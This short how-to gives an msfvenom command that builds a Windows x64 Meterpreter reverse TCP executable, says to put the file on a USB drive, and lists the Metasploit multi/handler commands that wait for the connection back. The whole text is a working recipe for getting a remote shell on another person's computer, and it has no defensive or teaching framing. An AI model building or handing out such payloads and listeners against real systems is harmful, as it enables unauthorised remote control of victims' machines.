In a terminal enter the following. Then, place the executable on a usb drive.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -a x64 -o /root/Desktop/<filename>.exe
```

### Within Metasploint set your options.
* Enter, use exploit/multi/handler

* Enter, set PAYLOAD windows/x64/meterpreter/reverse_tcp

* Enter, set LHOST <IP>

* Enter, set LPORT 4444

* Enter, run
